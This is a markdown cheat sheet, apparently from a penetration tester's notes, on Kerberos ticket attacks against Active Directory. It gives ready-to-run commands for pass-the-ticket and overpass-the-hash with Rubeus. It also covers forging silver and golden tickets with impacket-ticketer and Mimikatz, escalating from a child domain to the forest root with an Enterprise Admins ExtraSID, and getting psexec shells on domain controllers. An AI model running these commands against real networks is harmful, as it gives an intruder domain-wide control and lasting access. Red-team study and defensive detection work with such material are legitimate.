# Kerberos ticket handling and forging

## Use a ticket
Note client principal / realm, SPN, validity, encryption. `.kirbi`/base64 (Windows) and ccache (Linux) differ: convert before mixing.

```bash
(
  export KRB5CCNAME='/absolute/path/<USER>.ccache'
  klist -c "$KRB5CCNAME"
  impacket-smbclient -k -no-pass '<DOMAIN.TLD>/<USER>@<FQDN>'
)
```
- Subshell keeps your previous `KRB5CCNAME`. Verify client + service/realm.
- `klist` inspects caches; `klist -kte <KEYTAB>` lists keytab principals / enctypes. A keytab holds account keys, not a TGT. SSSD cached verifiers are not passable keys.

## Rubeus (Windows)
Use a separate logon session for injection: purging tickets in an unrelated session breaks its access.

```powershell
.\Rubeus.exe asktgt /user:<USER> /rc4:<NT> /ptt
.\Rubeus.exe asktgt /user:<USER> /aes256:<KEY> /ptt
.\Rubeus.exe ptt /ticket:<BASE64-OR-KIRBI>
.\Rubeus.exe triage
```
- `/rc4` = overpass-the-hash; `/aes256` if RC4 is disabled. Add `/domain:` and `/dc:` where needed.
- Dump tickets from memory with `dump /nowrap`. S4U → [delegation](delegation.md). Roasting → [authentication](authentication.md).

## NT hash from a password
```bash
python3 -c 'from getpass import getpass; from impacket.ntlm import compute_nthash; print(compute_nthash(getpass("Password: ")).hex())'
```
- NT hash = "the NTLM hash" (PtH / ticketer). NetNTLMv2 cannot be passed: crack it first → [ntlm](../windows/ntlm.md).

## Silver vs Golden
| Ticket | Key | Also needs |
| --- | --- | --- |
| Silver | Service account NT hash / AES key | Domain SID + exact SPN |
| Golden | `krbtgt` NT / AES key | Domain SID (DCSync-capable or on the DC) |

```powershell
setspn.exe -Q <SERVICE>/<FQDN>:<PORT>
```
```bash
# Silver
impacket-ticketer -nthash <SERVICE-NT> -domain-sid <DOMAIN-SID> -domain <DOMAIN.TLD> \
  -spn <SERVICE>/<FQDN>:<PORT> administrator
KRB5CCNAME="$PWD/administrator.ccache" impacket-mssqlclient -k -no-pass '<DOMAIN.TLD>/administrator@<FQDN>'
```
- Silver: SPN / account mapping and accepted encryption must match.
- MSSQL ticket accepted? Check login + role → [mssql](../enum/mssql.md#identity-and-rights).
- A service-account hash can't make a Golden ticket.
- PAC validation, key rotation and DC patch level can break old forging recipes.

## Golden ticket
RIDs for `-groups`: `512` Domain Admins · `513` Domain Users · `519` Enterprise Admins. `-user-id` = RID of the user (default 500).

```bash
impacket-ticketer -aesKey <KRBTGT-AES256> -domain-sid <DOMAIN-SID> -domain <DOMAIN.TLD> \
  -user-id <USER-RID> -groups 512,513 <USER>
export KRB5CCNAME=$PWD/<USER>.ccache
klist
impacket-psexec -k -no-pass <DOMAIN.TLD>/<USER>@<DC-FQDN>
impacket-psexec -k -no-pass -target-ip <DC-IP> <DOMAIN.TLD>/<USER>@<DC-FQDN>
```
- Use `-nthash <KRBTGT-NT>` instead of `-aesKey` if needed. Second `psexec` line = no DNS.

### Child domain → forest root
Add the root domain's Enterprise Admins SID as ExtraSID (`<ROOT-DOMAIN-SID>-519`):
```bash
impacket-ticketer -aesKey <CHILD-KRBTGT-AES256> -domain-sid <CHILD-DOMAIN-SID> -domain <CHILD-DOMAIN.TLD> \
  -user-id <USER-RID> -groups 512,513 -extra-sid <ROOT-DOMAIN-SID>-519 <USER>
export KRB5CCNAME=$PWD/<USER>.ccache
impacket-psexec -k -no-pass <CHILD-DOMAIN.TLD>/<USER>@<ROOT-DC-FQDN>
```

### Mimikatz
```text
kerberos::purge
kerberos::golden /user:<USER> /id:<USER-RID> /domain:<DOMAIN.TLD> /sid:<DOMAIN-SID> /aes256:<KRBTGT-AES256> /groups:512,513 /ptt
kerberos::golden /user:<USER> /id:<USER-RID> /domain:<CHILD-DOMAIN.TLD> /sid:<CHILD-DOMAIN-SID> /aes256:<CHILD-KRBTGT-AES256> /groups:512,513 /sids:<ROOT-DOMAIN-SID>-519 /ptt
```
```cmd
klist
dir \\<DC-FQDN>\c$
```
- Second `golden` line = child → root.
- PTT misbehaves inside Evil-WinRM / PsExec: forge on Kali with `impacket-ticketer` and use `impacket-psexec -k -no-pass`.

## Delegation
→ [delegation](delegation.md).
